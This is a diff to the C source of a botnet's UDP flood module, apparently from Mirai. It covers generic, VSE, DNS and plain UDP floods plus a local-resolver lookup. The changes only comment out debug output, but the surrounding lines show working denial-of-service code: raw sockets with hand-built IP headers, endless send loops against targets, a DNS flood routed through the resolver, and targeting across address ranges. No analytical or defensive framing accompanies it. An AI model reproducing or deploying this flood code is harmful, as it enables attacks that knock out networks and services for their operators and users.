@@ -40,18 +40,18 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
         data_len = 1460;
 
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("Failed to create raw socket. Aborting attack\n");
-#endif
+#endif*/
         return;
     }
     i = 1;
     if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("Failed to set IP_HDRINCL. Aborting\n");
-#endif
+#endif*/
         close(fd);
         return;
     }
@@ -117,12 +117,12 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
 
             targs[i].sock_addr.sin_port = udph->dest;
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
-        }
+        }/*
 #ifdef DEBUG
             break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
-#endif
+#endif*/
     }
 }
 
@@ -143,18 +143,18 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     vse_payload = table_retrieve_val(TABLE_ATK_VSE, &vse_payload_len);
 
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("Failed to create raw socket. Aborting attack\n");
-#endif
+#endif*/
         return;
     }
     i = 1;
     if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("Failed to set IP_HDRINCL. Aborting\n");
-#endif
+#endif*/
         close(fd);
         return;
     }
@@ -218,12 +218,12 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 
             targs[i].sock_addr.sin_port = udph->dest;
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
-        }
+        }/*
 #ifdef DEBUG
             break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
-#endif
+#endif*/
     }
 }
 
@@ -244,27 +244,27 @@ void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     ipv4_t dns_resolver = get_dns_resolver();
 
     if (domain == NULL)
-    {
+    {/*
 #ifdef DEBUG
         printf("Cannot send DNS flood without a domain\n");
-#endif
+#endif*/
         return;
     }
     domain_len = util_strlen(domain);
 
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("Failed to create raw socket. Aborting attack\n");
-#endif
+#endif*/
         return;
     }
     i = 1;
     if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("Failed to set IP_HDRINCL. Aborting\n");
-#endif
+#endif*/
         close(fd);
         return;
     }
@@ -363,20 +363,20 @@ void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             targs[i].sock_addr.sin_addr.s_addr = dns_resolver;
             targs[i].sock_addr.sin_port = udph->dest;
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
-        }
+        }/*
 #ifdef DEBUG
             break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
-#endif
+#endif*/
     }
 }
 
 void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
-{
+{/*
 #ifdef DEBUG
     printf("in udp plain\n");
-#endif
+#endif*/
 
     int i;
     char **pkts = calloc(targs_len, sizeof (char *));
@@ -393,11 +393,11 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
     } else {
         sport = htons(sport);
     }
-
+/*
 #ifdef DEBUG
     printf("after args\n");
 #endif
-
+*/
     for (i = 0; i < targs_len; i++)
     {
         struct iphdr *iph;
@@ -412,10 +412,10 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
             targs[i].sock_addr.sin_port = htons(dport);
 
         if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
-        {
+        {/*
 #ifdef DEBUG
             printf("Failed to create udp socket. Aborting attack\n");
-#endif
+#endif*/
             return;
         }
 
@@ -424,10 +424,10 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
         bind_addr.sin_addr.s_addr = 0;
 
         if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
-        {
+        {/*
 #ifdef DEBUG
             printf("Failed to bind udp socket.\n");
-#endif
+#endif*/
         }
 
         // For prefix attacks
@@ -435,17 +435,17 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
             targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
 
         if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
-        {
+        {/*
 #ifdef DEBUG
             printf("Failed to connect udp socket.\n");
-#endif
+#endif*/
         }
     }
-
+/*
 #ifdef DEBUG
     printf("after setup\n");
 #endif
-
+*/
     while (TRUE)
     {
         for (i = 0; i < targs_len; i++)
@@ -460,19 +460,19 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
             errno = 0;
             if (send(fds[i], data, data_len, MSG_NOSIGNAL) == -1)
             {
-                printf("send failed: %d\n", errno);
+                //printf("send failed: %d\n", errno);
             } else {
-                printf(".\n");
+                //printf(".\n");
             }
 #else
             send(fds[i], data, data_len, MSG_NOSIGNAL);
 #endif
-        }
+        }/*
 #ifdef DEBUG
             break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
-#endif
+#endif*/
     }
 }
 
@@ -524,10 +524,10 @@ static ipv4_t get_dns_resolver(void)
             }
 
             if (found)
-            {
+            {/*
 #ifdef DEBUG
                 printf("Found local resolver: '%s'\n", ipbuf);
-#endif
+#endif*/
                 return inet_addr(ipbuf);
             }
         }
